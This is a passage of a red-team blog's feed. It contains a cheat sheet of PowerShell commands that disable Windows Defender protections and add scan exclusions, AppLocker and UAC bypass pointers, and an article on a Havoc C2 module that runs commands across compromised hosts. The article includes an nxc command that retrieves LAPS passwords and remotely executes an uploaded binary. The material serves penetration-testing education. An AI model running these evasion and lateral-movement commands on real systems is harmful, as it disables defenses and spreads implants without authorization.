+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MpComputerStatus&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">RealTimeProtectionEnabled&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IoavProtectionEnabled&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">AntispywareEnabled&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">FL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check if tamper protection is enabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MpComputerStatus&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">IsTamperProtected&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">RealTimeProtectionEnabled&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">FL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># -----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disables realtime monitoring&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disables scanning for downloaded files or attachments&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable behaviour monitoring&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBehaviourMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Make exclusion for a certain folder&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-MpPreference&lt;/span> &lt;span class="n">-ExclusionPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\Temp&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disables cloud detection&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBlockAtFirstSeen&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disables scanning of .pst and other email formats&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableEmailScanning&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disables script scanning during malware scans&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MPPReference&lt;/span> &lt;span class="n">-DisableScriptScanning&lt;/span> &lt;span class="vm">$true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Exclude files by extension&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-ExclusionExtension&lt;/span> &lt;span class="s2">&amp;#34;ps1&amp;#34;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall" target="_blank" rel="noopener">https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3>AppLocker&lt;span class="hx-absolute -hx-mt-20" id="applocker">&lt;/span>
+&lt;a href="#applocker" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code>C:\windows\tasks
+C:\Windows\System32\spool\drivers\color&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h4>AppLocker: Finding writeable directories&lt;span class="hx-absolute -hx-mt-20" id="applocker-finding-writeable-directories">&lt;/span>
+&lt;a href="#applocker-finding-writeable-directories" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Look for writeable paths in the C:\windows directory&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-ChildItem&lt;/span> &lt;span class="s2">&amp;#34;c:\windows\&amp;#34;&lt;/span> &lt;span class="n">-recurse&lt;/span> &lt;span class="n">-ErrorAction&lt;/span> &lt;span class="n">SilentlyContinue&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$fileName&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">fullname&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$acls&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">get-acl&lt;/span> &lt;span class="nv">$fileName&lt;/span> &lt;span class="n">-ErrorAction&lt;/span> &lt;span class="n">SilentlyContinue&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-exp&lt;/span> &lt;span class="n">access&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">filesystemrights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;full|modify|write&amp;#34;&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">identityreference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;authenticated users|everyone|&lt;/span>&lt;span class="nv">$env:username&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$acls&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="vm">$null&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[&lt;/span>&lt;span class="no">pscustomobject&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">filename&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$fileName&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$acls&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-exp&lt;/span> &lt;span class="n">identityreference&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>UAC Bypass&lt;span class="hx-absolute -hx-mt-20" id="uac-bypass">&lt;/span>
+&lt;a href="#uac-bypass" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>The repo below has a great list of UAC bypasses to use in various condition (GUI, DLL hijack, etc). Easily modifiable to create a BOF or tool which does the same thing.&lt;/p>
+&lt;blockquote>
+&lt;p>Defeating Windows User Account Control
+Ref: &lt;a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME&lt;/a>&lt;/p>
+&lt;/blockquote></description></item><item><title>fyx(me)</title><link>https://fyx.me/</link><pubDate>Tue, 04 Mar 2025 00:00:00 +0000</pubDate><guid>https://fyx.me/</guid><description>
+&lt;div class="hx-mt-6 hx-mb-6">
+&lt;h1
+class="not-prose hx-text-4xl hx-leading-none hx-tracking-tighter md:hx-text-5xl hx-py-2 hx-bg-clip-text hx-text-transparent hx-bg-gradient-to-r hx-from-gray-900 hx-to-gray-600 dark:hx-from-gray-100 dark:hx-to-gray-400"
+>
+&lt;span class="fyxme-definition">&lt;img class="hx-inline" src="https://fyx.me/images/fyxme.svg" alt="fyx(me)" height="20" width="30"> fyx(me)&lt;/span>
+&lt;/h1>
+&lt;p
+class="not-prose hx-text-xl hx-text-gray-600 dark:hx-text-gray-400 sm:hx-text-xl"
+>
+&lt;div class="fyxme-definition hx-mt-4">
+[self] /fɪks miː/ : &lt;span style="color:#bbb">&lt;span class="def-prog">programmer&lt;/span>, &lt;span class="def-redteam">red teamer&lt;/span>, &lt;span class="def-pentester">pentester&lt;/span>, and &lt;span class="def-joat">jack of all trades&lt;/span> with a general passion for pretty much anything cyber.&lt;span>
+&lt;/div>
+&lt;/p>
+&lt;/div>
+&lt;div class="hx-mt-6 hx-mb-6">
+&lt;div class="hx-mb-4">
+&lt;h2
+class="not-prose hx-text-2xl hx-font-bold hx-leading-none hx-tracking-tighter md:hx-text-2xl hx-py-2 hx-bg-clip-text hx-text-transparent hx-bg-gradient-to-r hx-from-gray-900 hx-to-gray-600 dark:hx-from-gray-100 dark:hx-to-gray-400"
+>
+Current projects and research
+&lt;/h2>
+&lt;/div>
+&lt;div class="hx-mb-2">
+&lt;p
+class="not-prose hx-text-md sm:hx-text-md"
+>
+Developing new BOFs and improving old ones to extend open-source C2 capabilities:
+&lt;/p>
+&lt;/div>
+&lt;div class="landingpage-links">
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/fyxme/portscanbof" class="badge-btn badge-btn-red" target="_blank">code&lt;/a> &lt;a href="https://fyx.me/articles/replicating-cobalt-strikes-port-scanner-as-a-bof-for-open-source-c2-frameworks/" class="badge-btn badge-btn-blue">article&lt;/a>&lt;/span> Replicating Cobalt Strike&amp;rsquo;s Port Scanner as a BOF for Open-Source C2 Frameworks&lt;/li>
+&lt;li>&lt;a href="https://github.com/fyxme/havoc-runall-poc" class="badge-btn badge-btn-red" target="_blank">code&lt;/a> &lt;a href="https://fyx.me/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/" class="badge-btn badge-btn-blue">article&lt;/a> Creating a Havoc Module to run commands on all agents at once and map out an environment passively&lt;/li>
+&lt;li>&lt;a href="https://github.com/fyxme/enumpwshhistbof" class="badge-btn badge-btn-red" target="_blank">code&lt;/a> &lt;a class="badge-btn badge-btn-disabled">MINI&lt;/a> Writing a PowerShell history BOF to find sensitive information in all accessible PowerShell history files&lt;/li>
+&lt;li>&lt;a href="https://github.com/fyxme/OperatorsKit" class="badge-btn badge-btn-red" target="_blank">code&lt;/a> &lt;a href="https://fyx.me/minis/improving-functionality-of-open-source-bofs/" class="badge-btn badge-btn-teal">MINI&lt;/a> Improving functionality of open source BOFs&lt;/li>
+&lt;/ul>
+&lt;/div>
+&lt;/div>
+&lt;div class="hx-mb-2">
+&lt;p
+class="not-prose hx-text-md sm:hx-text-md"
+>
+More writeups:
+&lt;/p>
+&lt;/div>
+&lt;div class="landingpage-links">
+&lt;ul>
+&lt;li>&lt;a href="https://fyx.me/minis/creating-lightweight-windows-virtual-machines-for-your-personal-lab-environment/" class="badge-btn badge-btn-teal">MINI&lt;/a> Creating Lightweight Windows Virtual Machines for your Personal Lab Environment&lt;/li>
+&lt;li>&lt;a href="https://fyx.me/minis/create-infinite-email-aliases-using-cloudflare-email-routing/" class="badge-btn badge-btn-teal">MINI&lt;/a> Create Infinite Email aliases using Cloudflare Email Routing&lt;/li>
+&lt;/ul>
+&lt;/div>
+&lt;/div>
+&lt;br>
+&lt;div class="hx-mb-4">
+&lt;h2
+class="not-prose hx-text-2xl hx-font-bold hx-leading-none hx-tracking-tighter md:hx-text-2xl hx-py-2 hx-bg-clip-text hx-text-transparent hx-bg-gradient-to-r hx-from-gray-900 hx-to-gray-600 dark:hx-from-gray-100 dark:hx-to-gray-400"
+>
+Other quicklinks
+&lt;/h2>
+&lt;/div>
+&lt;div
+class="hextra-feature-grid hx-grid sm:max-lg:hx-grid-cols-2 max-sm:hx-grid-cols-1 hx-gap-4 hx-w-full not-prose"
+style="--hextra-feature-grid-cols: 3; "
+>
+&lt;a
+href="bazaar"
+style="background: radial-gradient(ellipse at 50% 80%,rgba(142,53,74,0.15),hsla(0,0%,100%,0));"
+class="hx-aspect-auto md:hx-aspect-[1.1/1] max-lg:hx-min-h-[340px] hextra-feature-card not-prose hx-block hx-relative hx-overflow-hidden hx-rounded-3xl hx-border hx-border-gray-200 hover:hx-border-gray-300 dark:hx-border-neutral-800 dark:hover:hx-border-neutral-700 before:hx-pointer-events-none before:hx-absolute before:hx-inset-0 before:hx-bg-glass-gradient"
+>
+&lt;div class="hx-relative hx-w-full hx-p-6">
+&lt;h3 class="hx-text-2xl hx-font-medium hx-leading-6 hx-mb-2 hx-flex hx-items-center">
+&lt;span>The bazaar&lt;/span>
+&lt;/h3>
+&lt;p class="hx-text-gray-500 dark:hx-text-gray-400 hx-text-sm hx-leading-6">The bazaar is a place for structured chaos where you can (sometimes) find cyber things you need. A wiki / cheatsheet combination of some sorts&amp;hellip;&lt;/p>
+&lt;/div>&lt;img src="gifs/unauthorized-access.webp" class="hx-absolute hx-max-w-none hx-top-[40%] hx-left-[36px] hx-w-[180%] sm:hx-w-[110%] dark:hx-opacity-80 hx-rounded-md" alt="The bazaar" />&lt;/a>
+&lt;a
+href="about"
+style="background: radial-gradient(ellipse at 50% 80%,rgba(221,210,59,0.15),hsla(0,0%,100%,0));"
+class="hx-aspect-auto md:hx-aspect-[1.1/1] max-md:hx-min-h-[340px] hextra-feature-card not-prose hx-block hx-relative hx-overflow-hidden hx-rounded-3xl hx-border hx-border-gray-200 hover:hx-border-gray-300 dark:hx-border-neutral-800 dark:hover:hx-border-neutral-700 before:hx-pointer-events-none before:hx-absolute before:hx-inset-0 before:hx-bg-glass-gradient"
+>
+&lt;div class="hx-relative hx-w-full hx-p-6">
+&lt;h3 class="hx-text-2xl hx-font-medium hx-leading-6 hx-mb-2 hx-flex hx-items-center">
+&lt;span>About fyx(me)&lt;/span>
+&lt;/h3>
+&lt;p class="hx-text-gray-500 dark:hx-text-gray-400 hx-text-sm hx-leading-6">Details about &lt;strong>fyx(me)&lt;/strong> the author, &lt;strong>fyx.me&lt;/strong> the website and a poem about a monkey.&lt;/p>
+&lt;/div>&lt;img src="gifs/monkey-computer-smoke.webp" class="hx-absolute hx-max-w-none hx-top-[40%] hx-left-[36px] hx-w-[110%] sm:hx-w-[110%] dark:hx-opacity-80 hx-rounded-md" alt="About fyx(me)" />&lt;/a>
+&lt;/div></description></item><item><title>Creating a Havoc Module to run commands on all agents at once and map out an environment passively</title><link>https://fyx.me/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/</link><pubDate>Sat, 01 Feb 2025 00:00:00 +0000</pubDate><guid>https://fyx.me/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-orange-100 hx-bg-orange-50 hx-text-orange-800 dark:hx-border-orange-400/30 dark:hx-bg-orange-400/20 dark:hx-text-orange-300">
+&lt;p class="hx-flex hx-items-center hx-font-medium">Tldr&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>Wrote a Havoc Module to run commands on all connected agents, used it to gather network information on all compromised hosts by performing packet captures, and analysed the data offline to map out the environment and find open ports and services. &lt;br>
+The tool can be found here: &lt;a href="https://github.com/fyxme/havoc-runall-poc" target="_blank" rel="noopener">https://github.com/fyxme/havoc-runall-poc&lt;/a>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;p>Do you sometimes get this urge to run &lt;code>rm -rf&lt;/code> on all your beacons at once? Or maybe you&amp;rsquo;re a ransomware operator who wants to execute your ransomware BOF through all your beacons? Worry no more, the Havoc Run All Module is here!&lt;/p>
+&lt;p>The Havoc Run All Module allows you to run commands on all connected agents, which could prove useful when searching for something, running post-exploitation on a number of hosts and/or downloading files on all compromised hosts at once.&lt;/p>
+&lt;p>&lt;em>Note: executing ransomware this way would actually be stupid since you&amp;rsquo;d need to have a beacon on every machine you wish to ransom&amp;hellip; As is currently done in ransomware operations, its much easier to use GPO, Intune, SCCM or any other software deployment tool. This is only a fun project which will increase IOCs when used and increase the likelihood of being compromised&amp;hellip; So &lt;a href="https://i1.kym-cdn.com/entries/icons/facebook/000/021/665/DpQ9YJl.jpg" target="_blank" rel="noopener">ackchyually&lt;/a>, I&amp;rsquo;m doing blue team a favor here. Its ok&amp;hellip; Thank me later.&lt;/em>&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Module%20Car%20salesman%20IOCs.webp" alt="" loading="lazy" />&lt;/p>
+&lt;h2>Figuring out which of my beacons are alive&lt;span class="hx-absolute -hx-mt-20" id="figuring-out-which-of-my-beacons-are-alive">&lt;/span>
+&lt;a href="#figuring-out-which-of-my-beacons-are-alive" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h2>&lt;p>The first use case I found for this was to sync all my beacons (using the sleep command) and finding out which of my beacons are alive by running a dummy BOF.&lt;/p>
+&lt;p>To sync all the beacons, I first run &lt;code>sleep 0&lt;/code> on all of them to get them to return all at the same time (some limitations in the current version of Havoc make it unreliable when the beacons do not return at similar intervals):&lt;/p>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20Sleep%200.webp" title="havoc &amp;gt; runall sleep 0" alt="" loading="lazy" />
+&lt;figcaption>havoc &amp;gt; runall sleep 0&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/Havoc%20Run%20All%20Sync-ed%20beacons.webp" title="All Havoc beacons synced together" alt="" loading="lazy" />
+&lt;figcaption>All Havoc beacons synced together&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>To get details about the alive beacons, I&amp;rsquo;ve created a command (&lt;code>getalive&lt;/code>) which run a dummy BOF on all the agents. This BOF returns the hostname and the username of the underlying beacon allowing us to check which beacons are actually alive and which ones might be dead:&lt;/p>
+&lt;p>
+&lt;img src="../img/Havoc%20Run%20All%20Get%20Alive%20Command.webp" alt="" loading="lazy" />&lt;/p>
+&lt;h2>Passively mapping out an internal environment using Packet Captures&lt;span class="hx-absolute -hx-mt-20" id="passively-mapping-out-an-internal-environment-using-packet-captures">&lt;/span>
+&lt;a href="#passively-mapping-out-an-internal-environment-using-packet-captures" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h2>&lt;p>With firewalls, network access controls, and network segmentation, it can be tough to identify which machines can talk to which ones. There are tools out there that can help map out a network environment but they require active scanning of target devices. You could also use DNS cache to get an idea of what the machine is trying to talk to but it does not necessarily correlate with what it can reach (eg. DNS for a machine that is firewall/blocked off).&lt;/p>
+&lt;p>Instead, we can look at currently outgoing data and see if we can create our own map from passively analysing network packets. To do this, we would need access to Network Routing Device like a switch or we can rely on running packet captures on a large number of hosts within the environment. Since we&amp;rsquo;re testing out the Havoc Run All Module (and there&amp;rsquo;s no network device we can compromise), we&amp;rsquo;ll use the second option and perform a packet capture on all of the hosts we have compromised.&lt;/p>
+&lt;h3>Gathering the data&lt;span class="hx-absolute -hx-mt-20" id="gathering-the-data">&lt;/span>
+&lt;a href="#gathering-the-data" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>We want to do this in the easiest way possible, without having to install tshark/wireshark or any other tools on the device. Since we&amp;rsquo;re targeting Windows machines, there are built-in tools we can use:&lt;/p>
+&lt;ul>
+&lt;li>The old school &lt;a href="https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts" target="_blank" rel="noopener">netsh&lt;/a> command which can capture network traffic using the &lt;code>netsh trace&lt;/code> sub-command&lt;/li>
+&lt;li>The new school &lt;a href="https://learn.microsoft.com/en-us/windows-server/networking/technologies/pktmon/pktmon" target="_blank" rel="noopener">pktmon (Packet monitor)&lt;/a> which is built-in to Windows, starting in Windows 10 (version 1809).&lt;/li>
+&lt;/ul>
+&lt;p>I wasn&amp;rsquo;t sure which Windows Host versions the environment was running and I didn&amp;rsquo;t want to check if every single one of those supported the new(ish) pktmon command so I opted for the trusty old school &lt;code>netsh&lt;/code> command.&lt;/p>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Note&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>If you need to execute a binary (eg. deploy a beacon) on multiple hosts at once, &lt;code>netexec&lt;/code> is a great tool for that.&lt;/p>
+&lt;p>&lt;a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">netexec&lt;/a> is very powerful and allows you to perform multiple actions with only one command. As such, you can build a &lt;code>netexec&lt;/code> (also know as &lt;code>nxc&lt;/code>) command to retrieve the LAPS password for multiple hosts, authenticate as the local administrator user to those hosts, upload a binary and execute it via command prompt (or PowerShell) in a single command:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb targets.txt -u &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$LAPSUSER&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$PASSHASH&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> --put-file &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SOURCE_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;\\Windows\\Temp\\&lt;/span>&lt;span class="nv">$TARGET_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -x &lt;span class="s2">&amp;#34;C:\\Windows\\Temp\\&lt;/span>&lt;span class="nv">$TARGET_BIN&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> --exec-method atexec --laps&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>where:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
